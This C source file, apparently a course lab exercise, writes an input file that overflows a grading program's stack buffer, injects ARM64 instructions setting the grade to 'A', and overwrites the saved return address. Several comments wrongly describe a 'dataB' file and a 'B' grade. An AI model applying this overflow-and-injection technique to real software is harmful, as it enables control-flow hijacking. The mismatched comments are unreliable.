/*----------------------------------------------------------------------
 * createdataA.c
 * Author: Praneeth Bhandaru
 *
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction in
 * main to get a B, the latter of which will overwrite getName's stored
 * x30.
----------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

static const unsigned int lReturnAddress = 0x42006C;
static const char sName[] = "Chinmay Bhandaru";


/* Takes no parameters. Opens (and potentially creates) file 'dataB'.
 * Writes a name, nullbyte, padding, and a binary memory address to the
 * file. Returns 0 upon completion. */
int main(void) {
    int i;
    unsigned int uiInstr;

    /* Open/create file dataB with write privileges */
    FILE *psFile = fopen("dataA", "w");

    /* Print the stored name into dataB */
    fprintf(psFile, sName);

    /* Add nullbytes to overrun the buffer and mark end of name */
    for (i = 0; i < 4; i++) {
        putc(0, psFile);
    }

    /* Add nullbytes to overrun the buffer and mark end of name */

    uiInstr = MiniAssembler_mov(0, 'A');

    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    uiInstr = MiniAssembler_adr(1, 0x420044,0x42006C);

    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    uiInstr = MiniAssembler_strb(0, 1);

    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    uiInstr = MiniAssembler_b(0x40089c, 0x420078);

    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Add nullbytes to overrun the buffer and mark end of name */
    for (i = 0; i < 12; i++) {
        putc(0, psFile);
    }

    /* Overwrite x30 with address of 'grade = 'B'' instruction */
    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
